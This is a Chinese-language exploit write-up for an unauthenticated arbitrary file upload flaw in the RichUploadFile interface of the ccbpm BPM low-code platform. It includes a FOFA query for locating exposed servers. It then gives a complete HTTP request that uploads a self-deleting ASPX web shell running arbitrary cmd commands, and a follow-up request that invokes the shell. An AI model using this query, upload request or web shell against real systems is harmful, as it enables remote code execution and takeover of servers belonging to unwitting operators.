## 驰骋BPM低代码开发平台-RichUploadFile-任意文件上传漏洞

## 一、漏洞简介
驰骋BPM低代码开发平台 RichUploadFile接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```
body="/WF/AppClassic/Home.htm" || body="ccbpm" || body="/DataUser/Icon/LogBig.png"
```

## POC
```
POST /WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryFfJ24P1AZBixjELj
Accept: /
Connection: close

------WebKitFormBoundaryFfJ24P1AZBixjELj
Content-Disposition: form-data; name="edit"; filename="rce.aspx"
Content-Type: image/jpeg

<%@ Page Language="Jscript" validateRequest="false"%>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out=System.IO.StreamReader;
EI=System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
e.Arguments="/c "+ Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();
%>
------WebKitFormBoundaryFfJ24P1AZBixjELj--
```

## POC
```
GET /DataUser/RichTextFile/Mazi/rce.aspx?cmd=dir HTTP/1.1
Host:
Accept: /

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=ynoywfgk15udo5y10rc1jw5; path=/; HttpOnly; SameSite=Lax
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 08-Jan-2026 03:08:18 GMT
Connection: close
Content-Length: 8649
```
